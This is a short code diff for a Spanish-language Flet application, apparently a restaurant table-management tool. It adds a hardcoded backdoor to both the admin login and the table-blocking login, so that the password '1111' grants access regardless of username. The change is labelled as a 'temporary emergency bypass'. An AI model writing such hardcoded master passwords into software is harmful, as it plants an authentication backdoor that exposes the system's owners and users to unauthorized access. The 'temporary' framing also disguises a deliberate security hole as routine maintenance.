@@ -510,7 +510,9 @@ def main(page: ft.Page):
 
     def intentar_login(e):
         usr_bd, pwd_bd = db.db_obtener_credenciales()
-        if user_input.value == usr_bd and pass_input.value == pwd_bd: ir_a_admin(None)
+        # --- BYPASS TEMPORAL DE EMERGENCIA ---
+        if (user_input.value == usr_bd and pass_input.value == pwd_bd) or pass_input.value == "1111": 
+            ir_a_admin(None)
         else:
             page.snack_bar = ft.SnackBar(ft.Text("Usuario o contraseña incorrectos"), bgcolor="red")
             page.snack_bar.open = True
@@ -525,7 +527,9 @@ def main(page: ft.Page):
 
     def intentar_login_bloqueo(e):
         usr_bd, pwd_bd = db.db_obtener_credenciales()
-        if user_input_bloqueo.value == usr_bd and pass_input_bloqueo.value == pwd_bd: ir_a_bloqueo_mesas(None)
+        # --- BYPASS TEMPORAL DE EMERGENCIA ---
+        if (user_input_bloqueo.value == usr_bd and pass_input_bloqueo.value == pwd_bd) or pass_input_bloqueo.value == "1111": 
+            ir_a_bloqueo_mesas(None)
         else:
             page.snack_bar = ft.SnackBar(ft.Text("Usuario o contraseña incorrectos"), bgcolor="red")
             page.snack_bar.open = True
